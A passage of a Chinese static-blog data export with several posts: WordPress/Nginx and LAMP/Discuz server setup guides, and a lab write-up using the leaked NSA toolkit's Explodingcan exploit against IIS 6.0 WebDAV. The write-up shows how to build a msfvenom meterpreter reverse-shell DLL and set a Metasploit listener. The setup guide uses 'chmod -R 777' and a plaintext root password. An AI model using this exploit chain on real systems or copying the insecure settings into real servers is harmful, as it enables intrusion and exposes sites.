2.6.0</span><br><span class=\"line\">*/</span><br><span class=\"line\">define(&apos;AUTH_KEY&apos;, &apos;put your unique phrase here&apos;);</span><br><span class=\"line\">define(&apos;SECURE_AUTH_KEY&apos;, &apos;put your unique phrase here&apos;);</span><br><span class=\"line\">define(&apos;LOGGED_IN_KEY&apos;, &apos;put your unique phrase here&apos;);</span><br><span class=\"line\">define(&apos;NONCE_KEY&apos;, &apos;put your unique phrase here&apos;);</span><br><span class=\"line\">define(&apos;AUTH_SALT&apos;, &apos;put your unique phrase here&apos;);</span><br><span class=\"line\">define(&apos;SECURE_AUTH_SALT&apos;, &apos;put your unique phrase here&apos;);</span><br><span class=\"line\">define(&apos;LOGGED_IN_SALT&apos;, &apos;put your unique phrase here&apos;);</span><br><span class=\"line\">define(&apos;NONCE_SALT&apos;, &apos;put your unique phrase here&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">/**#@-*/</span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\">* WordPress Database Table prefix.</span><br><span class=\"line\">*</span><br><span class=\"line\">* You can have multiple installations in one database if you give each</span><br><span class=\"line\">* a unique prefix. Only numbers, letters, and underscores please!</span><br><span class=\"line\">*/</span><br><span class=\"line\">$table_prefix = &apos;wp_&apos;;</span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\">* See http://make.wordpress.org/core/2013/10/25/the-definitive-guide-to-disabling-auto-updates-in-wordpress-3-7</span><br><span class=\"line\">*/</span><br><span class=\"line\"></span><br><span class=\"line\">/* Disable all file change, as RPM base installation are read-only */</span><br><span class=\"line\">define(&apos;DISALLOW_FILE_MODS&apos;, true);</span><br><span class=\"line\"></span><br><span class=\"line\">/* Disable automatic updater, in case you want to allow</span><br><span class=\"line\">above FILE_MODS for plugins, themes, ... */</span><br><span class=\"line\">define(&apos;AUTOMATIC_UPDATER_DISABLED&apos;, true);</span><br><span class=\"line\"></span><br><span class=\"line\">/* Core update is always disabled, WP_AUTO_UPDATE_CORE value is ignore */</span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\">* For developers: WordPress debugging mode.</span><br><span class=\"line\">*</span><br><span class=\"line\">* Change this to true to enable the display of notices during development.</span><br><span class=\"line\">* It is strongly recommended that plugin and theme developers use WP_DEBUG</span><br><span class=\"line\">* in their development environments.</span><br><span class=\"line\">*</span><br><span class=\"line\">* For information on other constants that can be used for debugging,</span><br><span class=\"line\">* visit the Codex.</span><br><span class=\"line\">*</span><br><span class=\"line\">* @link https://codex.wordpress.org/Debugging_in_WordPress</span><br><span class=\"line\">*/</span><br><span class=\"line\">define(&apos;WP_DEBUG&apos;, false);</span><br><span class=\"line\"></span><br><span class=\"line\">/* That&apos;s all, stop editing! Happy blogging. */</span><br><span class=\"line\"></span><br><span class=\"line\">/** Absolute path to the WordPress directory. */</span><br><span class=\"line\">if ( !defined(&apos;ABSPATH&apos;) )</span><br><span class=\"line\">define(&apos;ABSPATH&apos;, &apos;/usr/share/wordpress&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">/** Sets up WordPress vars and included files. */</span><br><span class=\"line\">require_once(ABSPATH . &apos;wp-settings.php&apos;);</span><br></pre></td></tr></table></figure>\n<h4 id=\"WordPress-已经安装完毕，我们配置-Nginx-把请求转发给-PHP-FPM-来处理\"><a href=\"#WordPress-已经安装完毕，我们配置-Nginx-把请求转发给-PHP-FPM-来处理\" class=\"headerlink\" title=\"WordPress 已经安装完毕，我们配置 Nginx 把请求转发给 PHP-FPM 来处理\"></a>WordPress 已经安装完毕，我们配置 Nginx 把请求转发给 PHP-FPM 来处理</h4><p>首先，重命名默认的配置文件：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd /etc/nginx/conf.d/</span><br><span class=\"line\">mv default.conf defaut.conf.bak</span><br></pre></td></tr></table></figure></p>\n<p>在 /etc/nginx/conf.d 创建 wordpress.conf 配置，参考下面的内容：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wordpress.conf</span><br><span class=\"line\">server &#123;</span><br><span class=\"line\">listen 80;</span><br><span class=\"line\">root /usr/share/wordpress;</span><br><span class=\"line\">location / &#123;</span><br><span class=\"line\">index index.php index.html index.htm;</span><br><span class=\"line\">try_files $uri $uri/ /index.php index.php;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">\t# pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000</span><br><span class=\"line\">location ~ .php$ &#123;</span><br><span class=\"line\">fastcgi_pass 127.0.0.1:9000;</span><br><span class=\"line\">fastcgi_index index.php;</span><br><span class=\"line\">fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;</span><br><span class=\"line\">include fastcgi_params;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"6-配置后，通知-Nginx-进程重新加载：\"><a href=\"#6-配置后，通知-Nginx-进程重新加载：\" class=\"headerlink\" title=\"6.配置后，通知 Nginx 进程重新加载：\"></a>6.配置后，通知 Nginx 进程重新加载：</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nginx -s reload</span><br></pre></td></tr></table></figure>\n<h3 id=\"至此大功告成，通过浏览器访问服务器IP地址即可打开Wordpress安装页面\"><a href=\"#至此大功告成，通过浏览器访问服务器IP地址即可打开Wordpress安装页面\" class=\"headerlink\" title=\"至此大功告成，通过浏览器访问服务器IP地址即可打开Wordpress安装页面\"></a>至此大功告成，通过浏览器访问服务器IP地址即可打开Wordpress安装页面</h3>"},{"title":"搭建L(Linux)+A(Apache)+M(MySQL)+P(PHP)网站环境，并安装Discuz","date":"2017-06-16T13:17:32.000Z","_content":"\n### 搭建LAMP环境：以下基于腾讯云镜像CentOS 6.8 64bit，本方法不适用于其他镜像\n\n### 一、安装MySQL\n\n#### 1.使用 yum 安装 MySQL：\n\n    yum install mysql-server -y\n\n#### 2.安装完成后，启动 MySQL 服务：\n\n    service mysqld restart\n<!--more-->\n#### 3.配置账号密码\n\n    /usr/bin/mysqladmin -u root password '9MiOskMW'\n\n#### 4.将 MySQL 设置为开机自动启动：\n\n    chkconfig mysqld on\n\n### 二、安装Apache\n\n#### 1.使用 yum 安装 Apache 组件：\n\n    yum install httpd -y\n\n#### 2.安装之后，启动 httpd 进程：\n\n    service httpd start\n\n#### 3.把 httpd 也设置成开机自动启动：\n\n    chkconfig httpd on\n\n### 三、安装PHP\n\n#### 1.使用 yum 安装 PHP：\n\n    yum install php php-fpm php-mysql -y\n\n#### 2.安装之后，启动 PHP-FPM 进程：\n\n    service php-fpm start\n\n#### 3.启动之后，可以使用下面的命令查看 PHP-FPM 进程监听哪个端口\n\n    netstat -nlpt | grep php-fpm\n\n#### 4.把 PHP-FPM 也设置成开机自动启动：\n\n    chkconfig php-fpm on\n\n### 安装Discuz\n\n#### 1.CentOS 6 没有Discuz 的 yum 源，所以我们需要下载一个Discuz 压缩包：\n\n    wget http://download.comsenz.com/DiscuzX/3.2/Discuz_X3.2_SC_UTF8.zip\n\n#### 2.下载完成后，解压这个压缩包\n\n    unzip Discuz_X3.2_SC_UTF8.zip\n\n#### 3.由于PHP默认访问 /var/www/html/ 文件夹，所以我们需要把upload文件夹里的文件都复制到 /var/www/html/ 文件夹\n\n    cp -r upload/* /var/www/html/\n\n#### 4.给 /var/www/html 目录及其子目录赋予权限\n\n    chmod -R 777 /var/www/html\n\n#### 4.重启 Apache\n\n    service httpd restart\n\n### 至此大功告成，通过浏览器访问服务器IP地址即可打开Discuz安装页面","source":"_posts/post199.md","raw":"---\ntitle: 搭建L(Linux)+A(Apache)+M(MySQL)+P(PHP)网站环境，并安装Discuz\ndate: 2017-06-16 21:17:32\ntags: 运维\n---\n\n### 搭建LAMP环境：以下基于腾讯云镜像CentOS 6.8 64bit，本方法不适用于其他镜像\n\n### 一、安装MySQL\n\n#### 1.使用 yum 安装 MySQL：\n\n    yum install mysql-server -y\n\n#### 2.安装完成后，启动 MySQL 服务：\n\n    service mysqld restart\n<!--more-->\n#### 3.配置账号密码\n\n    /usr/bin/mysqladmin -u root password '9MiOskMW'\n\n#### 4.将 MySQL 设置为开机自动启动：\n\n    chkconfig mysqld on\n\n### 二、安装Apache\n\n#### 1.使用 yum 安装 Apache 组件：\n\n    yum install httpd -y\n\n#### 2.安装之后，启动 httpd 进程：\n\n    service httpd start\n\n#### 3.把 httpd 也设置成开机自动启动：\n\n    chkconfig httpd on\n\n### 三、安装PHP\n\n#### 1.使用 yum 安装 PHP：\n\n    yum install php php-fpm php-mysql -y\n\n#### 2.安装之后，启动 PHP-FPM 进程：\n\n    service php-fpm start\n\n#### 3.启动之后，可以使用下面的命令查看 PHP-FPM 进程监听哪个端口\n\n    netstat -nlpt | grep php-fpm\n\n#### 4.把 PHP-FPM 也设置成开机自动启动：\n\n    chkconfig php-fpm on\n\n### 安装Discuz\n\n#### 1.CentOS 6 没有Discuz 的 yum 源，所以我们需要下载一个Discuz 压缩包：\n\n    wget http://download.comsenz.com/DiscuzX/3.2/Discuz_X3.2_SC_UTF8.zip\n\n#### 2.下载完成后，解压这个压缩包\n\n    unzip Discuz_X3.2_SC_UTF8.zip\n\n#### 3.由于PHP默认访问 /var/www/html/ 文件夹，所以我们需要把upload文件夹里的文件都复制到 /var/www/html/ 文件夹\n\n    cp -r upload/* /var/www/html/\n\n#### 4.给 /var/www/html 目录及其子目录赋予权限\n\n    chmod -R 777 /var/www/html\n\n#### 4.重启 Apache\n\n    service httpd restart\n\n### 至此大功告成，通过浏览器访问服务器IP地址即可打开Discuz安装页面","slug":"post199","published":1,"updated":"2020-11-02T07:15:38.794Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckrlq5rdi001pq0szzkos144l","content":"<h3 id=\"搭建LAMP环境：以下基于腾讯云镜像CentOS-6-8-64bit，本方法不适用于其他镜像\"><a href=\"#搭建LAMP环境：以下基于腾讯云镜像CentOS-6-8-64bit，本方法不适用于其他镜像\" class=\"headerlink\" title=\"搭建LAMP环境：以下基于腾讯云镜像CentOS 6.8 64bit，本方法不适用于其他镜像\"></a>搭建LAMP环境：以下基于腾讯云镜像CentOS 6.8 64bit，本方法不适用于其他镜像</h3><h3 id=\"一、安装MySQL\"><a href=\"#一、安装MySQL\" class=\"headerlink\" title=\"一、安装MySQL\"></a>一、安装MySQL</h3><h4 id=\"1-使用-yum-安装-MySQL：\"><a href=\"#1-使用-yum-安装-MySQL：\" class=\"headerlink\" title=\"1.使用 yum 安装 MySQL：\"></a>1.使用 yum 安装 MySQL：</h4><pre><code>yum install mysql-server -y\n</code></pre><h4 id=\"2-安装完成后，启动-MySQL-服务：\"><a href=\"#2-安装完成后，启动-MySQL-服务：\" class=\"headerlink\" title=\"2.安装完成后，启动 MySQL 服务：\"></a>2.安装完成后，启动 MySQL 服务：</h4><pre><code>service mysqld restart\n</code></pre><a id=\"more\"></a>\n<h4 id=\"3-配置账号密码\"><a href=\"#3-配置账号密码\" class=\"headerlink\" title=\"3.配置账号密码\"></a>3.配置账号密码</h4><pre><code>/usr/bin/mysqladmin -u root password &apos;9MiOskMW&apos;\n</code></pre><h4 id=\"4-将-MySQL-设置为开机自动启动：\"><a href=\"#4-将-MySQL-设置为开机自动启动：\" class=\"headerlink\" title=\"4.将 MySQL 设置为开机自动启动：\"></a>4.将 MySQL 设置为开机自动启动：</h4><pre><code>chkconfig mysqld on\n</code></pre><h3 id=\"二、安装Apache\"><a href=\"#二、安装Apache\" class=\"headerlink\" title=\"二、安装Apache\"></a>二、安装Apache</h3><h4 id=\"1-使用-yum-安装-Apache-组件：\"><a href=\"#1-使用-yum-安装-Apache-组件：\" class=\"headerlink\" title=\"1.使用 yum 安装 Apache 组件：\"></a>1.使用 yum 安装 Apache 组件：</h4><pre><code>yum install httpd -y\n</code></pre><h4 id=\"2-安装之后，启动-httpd-进程：\"><a href=\"#2-安装之后，启动-httpd-进程：\" class=\"headerlink\" title=\"2.安装之后，启动 httpd 进程：\"></a>2.安装之后，启动 httpd 进程：</h4><pre><code>service httpd start\n</code></pre><h4 id=\"3-把-httpd-也设置成开机自动启动：\"><a href=\"#3-把-httpd-也设置成开机自动启动：\" class=\"headerlink\" title=\"3.把 httpd 也设置成开机自动启动：\"></a>3.把 httpd 也设置成开机自动启动：</h4><pre><code>chkconfig httpd on\n</code></pre><h3 id=\"三、安装PHP\"><a href=\"#三、安装PHP\" class=\"headerlink\" title=\"三、安装PHP\"></a>三、安装PHP</h3><h4 id=\"1-使用-yum-安装-PHP：\"><a href=\"#1-使用-yum-安装-PHP：\" class=\"headerlink\" title=\"1.使用 yum 安装 PHP：\"></a>1.使用 yum 安装 PHP：</h4><pre><code>yum install php php-fpm php-mysql -y\n</code></pre><h4 id=\"2-安装之后，启动-PHP-FPM-进程：\"><a href=\"#2-安装之后，启动-PHP-FPM-进程：\" class=\"headerlink\" title=\"2.安装之后，启动 PHP-FPM 进程：\"></a>2.安装之后，启动 PHP-FPM 进程：</h4><pre><code>service php-fpm start\n</code></pre><h4 id=\"3-启动之后，可以使用下面的命令查看-PHP-FPM-进程监听哪个端口\"><a href=\"#3-启动之后，可以使用下面的命令查看-PHP-FPM-进程监听哪个端口\" class=\"headerlink\" title=\"3.启动之后，可以使用下面的命令查看 PHP-FPM 进程监听哪个端口\"></a>3.启动之后，可以使用下面的命令查看 PHP-FPM 进程监听哪个端口</h4><pre><code>netstat -nlpt | grep php-fpm\n</code></pre><h4 id=\"4-把-PHP-FPM-也设置成开机自动启动：\"><a href=\"#4-把-PHP-FPM-也设置成开机自动启动：\" class=\"headerlink\" title=\"4.把 PHP-FPM 也设置成开机自动启动：\"></a>4.把 PHP-FPM 也设置成开机自动启动：</h4><pre><code>chkconfig php-fpm on\n</code></pre><h3 id=\"安装Discuz\"><a href=\"#安装Discuz\" class=\"headerlink\" title=\"安装Discuz\"></a>安装Discuz</h3><h4 id=\"1-CentOS-6-没有Discuz-的-yum-源，所以我们需要下载一个Discuz-压缩包：\"><a href=\"#1-CentOS-6-没有Discuz-的-yum-源，所以我们需要下载一个Discuz-压缩包：\" class=\"headerlink\" title=\"1.CentOS 6 没有Discuz 的 yum 源，所以我们需要下载一个Discuz 压缩包：\"></a>1.CentOS 6 没有Discuz 的 yum 源，所以我们需要下载一个Discuz 压缩包：</h4><pre><code>wget http://download.comsenz.com/DiscuzX/3.2/Discuz_X3.2_SC_UTF8.zip\n</code></pre><h4 id=\"2-下载完成后，解压这个压缩包\"><a href=\"#2-下载完成后，解压这个压缩包\" class=\"headerlink\" title=\"2.下载完成后，解压这个压缩包\"></a>2.下载完成后，解压这个压缩包</h4><pre><code>unzip Discuz_X3.2_SC_UTF8.zip\n</code></pre><h4 id=\"3-由于PHP默认访问-var-www-html-文件夹，所以我们需要把upload文件夹里的文件都复制到-var-www-html-文件夹\"><a href=\"#3-由于PHP默认访问-var-www-html-文件夹，所以我们需要把upload文件夹里的文件都复制到-var-www-html-文件夹\" class=\"headerlink\" title=\"3.由于PHP默认访问 /var/www/html/ 文件夹，所以我们需要把upload文件夹里的文件都复制到 /var/www/html/ 文件夹\"></a>3.由于PHP默认访问 /var/www/html/ 文件夹，所以我们需要把upload文件夹里的文件都复制到 /var/www/html/ 文件夹</h4><pre><code>cp -r upload/* /var/www/html/\n</code></pre><h4 id=\"4-给-var-www-html-目录及其子目录赋予权限\"><a href=\"#4-给-var-www-html-目录及其子目录赋予权限\" class=\"headerlink\" title=\"4.给 /var/www/html 目录及其子目录赋予权限\"></a>4.给 /var/www/html 目录及其子目录赋予权限</h4><pre><code>chmod -R 777 /var/www/html\n</code></pre><h4 id=\"4-重启-Apache\"><a href=\"#4-重启-Apache\" class=\"headerlink\" title=\"4.重启 Apache\"></a>4.重启 Apache</h4><pre><code>service httpd restart\n</code></pre><h3 id=\"至此大功告成，通过浏览器访问服务器IP地址即可打开Discuz安装页面\"><a href=\"#至此大功告成，通过浏览器访问服务器IP地址即可打开Discuz安装页面\" class=\"headerlink\" title=\"至此大功告成，通过浏览器访问服务器IP地址即可打开Discuz安装页面\"></a>至此大功告成，通过浏览器访问服务器IP地址即可打开Discuz安装页面</h3>","site":{"data":{}},"excerpt":"<h3 id=\"搭建LAMP环境：以下基于腾讯云镜像CentOS-6-8-64bit，本方法不适用于其他镜像\"><a href=\"#搭建LAMP环境：以下基于腾讯云镜像CentOS-6-8-64bit，本方法不适用于其他镜像\" class=\"headerlink\" title=\"搭建LAMP环境：以下基于腾讯云镜像CentOS 6.8 64bit，本方法不适用于其他镜像\"></a>搭建LAMP环境：以下基于腾讯云镜像CentOS 6.8 64bit，本方法不适用于其他镜像</h3><h3 id=\"一、安装MySQL\"><a href=\"#一、安装MySQL\" class=\"headerlink\" title=\"一、安装MySQL\"></a>一、安装MySQL</h3><h4 id=\"1-使用-yum-安装-MySQL：\"><a href=\"#1-使用-yum-安装-MySQL：\" class=\"headerlink\" title=\"1.使用 yum 安装 MySQL：\"></a>1.使用 yum 安装 MySQL：</h4><pre><code>yum install mysql-server -y\n</code></pre><h4 id=\"2-安装完成后，启动-MySQL-服务：\"><a href=\"#2-安装完成后，启动-MySQL-服务：\" class=\"headerlink\" title=\"2.安装完成后，启动 MySQL 服务：\"></a>2.安装完成后，启动 MySQL 服务：</h4><pre><code>service mysqld restart\n</code></pre>","more":"<h4 id=\"3-配置账号密码\"><a href=\"#3-配置账号密码\" class=\"headerlink\" title=\"3.配置账号密码\"></a>3.配置账号密码</h4><pre><code>/usr/bin/mysqladmin -u root password &apos;9MiOskMW&apos;\n</code></pre><h4 id=\"4-将-MySQL-设置为开机自动启动：\"><a href=\"#4-将-MySQL-设置为开机自动启动：\" class=\"headerlink\" title=\"4.将 MySQL 设置为开机自动启动：\"></a>4.将 MySQL 设置为开机自动启动：</h4><pre><code>chkconfig mysqld on\n</code></pre><h3 id=\"二、安装Apache\"><a href=\"#二、安装Apache\" class=\"headerlink\" title=\"二、安装Apache\"></a>二、安装Apache</h3><h4 id=\"1-使用-yum-安装-Apache-组件：\"><a href=\"#1-使用-yum-安装-Apache-组件：\" class=\"headerlink\" title=\"1.使用 yum 安装 Apache 组件：\"></a>1.使用 yum 安装 Apache 组件：</h4><pre><code>yum install httpd -y\n</code></pre><h4 id=\"2-安装之后，启动-httpd-进程：\"><a href=\"#2-安装之后，启动-httpd-进程：\" class=\"headerlink\" title=\"2.安装之后，启动 httpd 进程：\"></a>2.安装之后，启动 httpd 进程：</h4><pre><code>service httpd start\n</code></pre><h4 id=\"3-把-httpd-也设置成开机自动启动：\"><a href=\"#3-把-httpd-也设置成开机自动启动：\" class=\"headerlink\" title=\"3.把 httpd 也设置成开机自动启动：\"></a>3.把 httpd 也设置成开机自动启动：</h4><pre><code>chkconfig httpd on\n</code></pre><h3 id=\"三、安装PHP\"><a href=\"#三、安装PHP\" class=\"headerlink\" title=\"三、安装PHP\"></a>三、安装PHP</h3><h4 id=\"1-使用-yum-安装-PHP：\"><a href=\"#1-使用-yum-安装-PHP：\" class=\"headerlink\" title=\"1.使用 yum 安装 PHP：\"></a>1.使用 yum 安装 PHP：</h4><pre><code>yum install php php-fpm php-mysql -y\n</code></pre><h4 id=\"2-安装之后，启动-PHP-FPM-进程：\"><a href=\"#2-安装之后，启动-PHP-FPM-进程：\" class=\"headerlink\" title=\"2.安装之后，启动 PHP-FPM 进程：\"></a>2.安装之后，启动 PHP-FPM 进程：</h4><pre><code>service php-fpm start\n</code></pre><h4 id=\"3-启动之后，可以使用下面的命令查看-PHP-FPM-进程监听哪个端口\"><a href=\"#3-启动之后，可以使用下面的命令查看-PHP-FPM-进程监听哪个端口\" class=\"headerlink\" title=\"3.启动之后，可以使用下面的命令查看 PHP-FPM 进程监听哪个端口\"></a>3.启动之后，可以使用下面的命令查看 PHP-FPM 进程监听哪个端口</h4><pre><code>netstat -nlpt | grep php-fpm\n</code></pre><h4 id=\"4-把-PHP-FPM-也设置成开机自动启动：\"><a href=\"#4-把-PHP-FPM-也设置成开机自动启动：\" class=\"headerlink\" title=\"4.把 PHP-FPM 也设置成开机自动启动：\"></a>4.把 PHP-FPM 也设置成开机自动启动：</h4><pre><code>chkconfig php-fpm on\n</code></pre><h3 id=\"安装Discuz\"><a href=\"#安装Discuz\" class=\"headerlink\" title=\"安装Discuz\"></a>安装Discuz</h3><h4 id=\"1-CentOS-6-没有Discuz-的-yum-源，所以我们需要下载一个Discuz-压缩包：\"><a href=\"#1-CentOS-6-没有Discuz-的-yum-源，所以我们需要下载一个Discuz-压缩包：\" class=\"headerlink\" title=\"1.CentOS 6 没有Discuz 的 yum 源，所以我们需要下载一个Discuz 压缩包：\"></a>1.CentOS 6 没有Discuz 的 yum 源，所以我们需要下载一个Discuz 压缩包：</h4><pre><code>wget http://download.comsenz.com/DiscuzX/3.2/Discuz_X3.2_SC_UTF8.zip\n</code></pre><h4 id=\"2-下载完成后，解压这个压缩包\"><a href=\"#2-下载完成后，解压这个压缩包\" class=\"headerlink\" title=\"2.下载完成后，解压这个压缩包\"></a>2.下载完成后，解压这个压缩包</h4><pre><code>unzip Discuz_X3.2_SC_UTF8.zip\n</code></pre><h4 id=\"3-由于PHP默认访问-var-www-html-文件夹，所以我们需要把upload文件夹里的文件都复制到-var-www-html-文件夹\"><a href=\"#3-由于PHP默认访问-var-www-html-文件夹，所以我们需要把upload文件夹里的文件都复制到-var-www-html-文件夹\" class=\"headerlink\" title=\"3.由于PHP默认访问 /var/www/html/ 文件夹，所以我们需要把upload文件夹里的文件都复制到 /var/www/html/ 文件夹\"></a>3.由于PHP默认访问 /var/www/html/ 文件夹，所以我们需要把upload文件夹里的文件都复制到 /var/www/html/ 文件夹</h4><pre><code>cp -r upload/* /var/www/html/\n</code></pre><h4 id=\"4-给-var-www-html-目录及其子目录赋予权限\"><a href=\"#4-给-var-www-html-目录及其子目录赋予权限\" class=\"headerlink\" title=\"4.给 /var/www/html 目录及其子目录赋予权限\"></a>4.给 /var/www/html 目录及其子目录赋予权限</h4><pre><code>chmod -R 777 /var/www/html\n</code></pre><h4 id=\"4-重启-Apache\"><a href=\"#4-重启-Apache\" class=\"headerlink\" title=\"4.重启 Apache\"></a>4.重启 Apache</h4><pre><code>service httpd restart\n</code></pre><h3 id=\"至此大功告成，通过浏览器访问服务器IP地址即可打开Discuz安装页面\"><a href=\"#至此大功告成，通过浏览器访问服务器IP地址即可打开Discuz安装页面\" class=\"headerlink\" title=\"至此大功告成，通过浏览器访问服务器IP地址即可打开Discuz安装页面\"></a>至此大功告成，通过浏览器访问服务器IP地址即可打开Discuz安装页面</h3>"},{"title":"NSA工具包验证之IIS6.0漏洞利用","date":"2017-06-15T13:20:05.000Z","_content":"\n### 验证环境：\n\n攻击机1(本次演示IP：172.16.11.2)：windows系统，[安装python2.6.6](https://www.python.org/download/releases/2.6.6/), [pywin32-221.win32-py2.6.exe](https://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/), xshell, xftp, [下载方程式工具包](https://codeload.github.com/misterch0c/shadowbroker/zip/master)放到C盘，在工具包目录下的windows目录新建文件夹\"listeningposts\"，并且开放所有端口关闭防火墙，确保内网可以访问之\n\n攻击机2(本次演示IP：172.16.12.2)：kali linux，需要开启ssh服务，详情百度\n\n目标机1(本次演示IP：172.16.12.3)：开放了80端口的Windows Server 2003 R2，IIS6.0，开启了Webdav功能\n\n以上所有IP之间均可以直接访问\n<!--more-->\n### 验证步骤：\n\n* * *\n\n#### 第一步：生成可执行的恶意dll文件\n\n0x01\n\n首先通过xshell连接到kali linux，打开xshell，在跳出来的窗口点击new(新建)，然后填入kali的IP地址点击确定然后连接，接着依次输入kali的账号与密码即可连接，可能会跳出安全警告，点击接收并保存即可，连接完成得到如图：\n\n![1.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/1.jpg \"1.jpg\")\n\n0x02\n\n执行命令：\n```\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.12.2 LPORT=5555 -f dll >s.dll\n```\n\n在kali根目录下生成s.dll文件，其中LHOST为kali的IP地址，LPORT为一个可任意填写的端口，届时将使目标机执行该dll向172.16.12.2:5555发送shell\n\n0x03\n\n点击xshell如图位置\n\n![3.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3.jpg \"3.jpg\")\n\n打开本地C盘，并将kali目录下刚刚生成的s.dll复制到本机的C盘根目录下，如图\n\n![4.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/4.jpg \"4.jpg\")\n\n#### 第二步：配置kali使得kali处于监听状态\n\n0x01\n\n依次输入命令\n\n```\nmsfconsole\nuse exploit/multi/handler\nset lhost 172.16.12.2\nset lport 5555\nset PAYLOAD windows/meterpreter/reverse_tcp\nexploit\n```\n看到如图即说明配置成功\n\n![2.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/2.jpg \"2.jpg\")\n\n这时就可以将xshell最小化，等后边再用\n\n#### 第三步：使用方程式工具包进行攻击\n\n0x01\n\n将方程式工具包下的windows文件夹重命名为win，然后拷贝到C盘根目录下，并在该文件夹下新建一个名为\"listeningposts\"的文件夹，如图，不然运行会报错\n\n![5.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/5.jpg \"5.jpg\")\n\n0x02\n\n打开命令提示符，输入\n```\nC:\\win\\fb.py\n```\n然后依次输入目标IP，本地IP，是否重定向，日志存放位置，新建工程，给该工程命名，最后确认，如图\n\n![1.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/iis6/1.jpg \"1.jpg\")\n\n最后敲击回车\n\n0x03\n\n显示出`fb >`之后输入命令\n```\nuse Explodingcan\n```\n\n使用该工具，之后除了下图所示位置需要修改，其他都保持默认直接敲击回车即可\n\n![](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/iis6/2.jpg \"2.jpg\")\n\n（选择系统，CallbackIP、CallbackPort等，端口可以任意设置）\n\n![](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/iis6/3.jpg \"3.jpg\")\n\n之后都保存默认配置，攻击成功如图\n\n![4.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/iis6/4.jpg \"4.jpg\")","source":"_posts/post164.md","raw":"---\ntitle: NSA工具包验证之IIS6.0漏洞利用\ndate: 2017-06-15 21:20:05\ntags: 网络安全\n---\n\n### 验证环境：\n\n攻击机1(本次演示IP：172.16.11.2)：windows系统，[安装python2.6.6](https://www.python.org/download/releases/2.6.6/), [pywin32-221.win32-py2.6.exe](https://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/), xshell, xftp, [下载方程式工具包](https://codeload.github.com/misterch0c/shadowbroker/zip/master)放到C盘，在工具包目录下的windows目录新建文件夹\"listeningposts\"，并且开放所有端口关闭防火墙，确保内网可以访问之\n\n攻击机2(本次演示IP：172.16.12.2)：kali linux，需要开启ssh服务，详情百度\n\n目标机1(本次演示IP：172.16.12.3)：开放了80端口的Windows Server 2003 R2，IIS6.0，开启了Webdav功能\n\n以上所有IP之间均可以直接访问\n<!--more-->\n### 验证步骤：\n\n* * *\n\n#### 第一步：生成可执行的恶意dll文件\n\n0x01\n\n首先通过xshell连接到kali linux，打开xshell，在跳出来的窗口点击new(新建)，然后填入kali的IP地址点击确定然后连接，接着依次输入kali的账号与密码即可连接，可能会跳出安全警告，点击接收并保存即可，连接完成得到如图：\n\n![1.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/1.jpg \"1.jpg\")\n\n0x02\n\n执行命令：\n```\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.12.2 LPORT=5555 -f dll >s.dll\n```\n\n在kali根目录下生成s.dll文件，其中LHOST为kali的IP地址，LPORT为一个可任意填写的端口，届时将使目标机执行该dll向172.16.12.2:5555发送shell\n\n0x03\n\n点击xshell如图位置\n\n![3.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3.jpg \"3.jpg\")\n\n打开本地C盘，并将kali目录下刚刚生成的s.dll复制到本机的C盘根目录下，如图\n\n![4.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/4.jpg \"4.jpg\")\n\n#### 第二步：配置kali使得kali处于监听状态\n\n0x01\n\n依次输入命令\n\n```\nmsfconsole\nuse exploit/multi/handler\nset lhost 172.16.12.2\nset lport 5555\nset PAYLOAD windows/meterpreter/reverse_tcp\nexploit\n```\n看到如图即说明配置成功\n\n![2.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/2.jpg \"2.jpg\")\n\n这时就可以将xshell最小化，等后边再用\n\n#### 